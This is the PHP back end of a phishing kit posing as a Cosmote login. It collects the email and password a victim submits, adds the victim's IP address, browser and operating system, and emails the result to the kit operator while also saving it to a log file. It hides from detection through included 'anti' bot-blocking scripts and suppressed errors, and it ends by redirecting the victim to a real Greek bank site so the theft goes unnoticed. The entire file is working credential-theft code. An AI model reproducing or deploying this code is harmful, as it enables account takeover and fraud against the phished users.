<?php
	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../prevents/9atila.php';
	session_start();
	//error_reporting(0);	
	
	require 'Settings.php';
	require 'functions.php';

	
	$log="";
	if(isset($_POST['email']))
		$log=$_POST['email'];
	
	$_SESSION['_Log_Id_'] =$log;
	
	
	$pass="";
	if(isset($_POST['password']))
		$pass=$_POST['password'];
	
	 
	$message="+++ RESULT 💚 COSMOTE 2💸💎 +++\r\n";

	$message.="log          : ".$log."\r\n";
	$message.="Pass 	    : ".$pass."\r\n";
	$message.="++++++++++++++++++++++++++++\r\n\n";
	$message.="IP adresse   : ".GetIP()."\r\n";
	$message.="Navigateur   : ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\r\n";
	$message.="Systeme      : ".getOS($_SERVER['HTTP_USER_AGENT'])."\r\n";
	$message.="Agent Client : ".$_SERVER['HTTP_USER_AGENT']."\r\n";
	$message.="++++++++++++++++++++++++++++\r\n\n";
	
	$message_subject = "RESULT 💚 COSMOTE 2💸💎 || ".$_SESSION['_Log_Id_'];
	
	$message_headers .= "From:zombie.of.hell<noreply@pg.org>";
    $message_headers .= "MIME-Version: 1.0\n";
	
	mail ($e_mail,$message_subject,$message, $message_subject);
	if($writeInFile){
		$file = fopen("../../file/log.txt","a");
		fwrite($file, $message."\r\n\r\n\r\n\r\n");
		fclose($file);
	}
	
	HEADER("Location: https://ibank.nbg.gr/", true, 303);

?>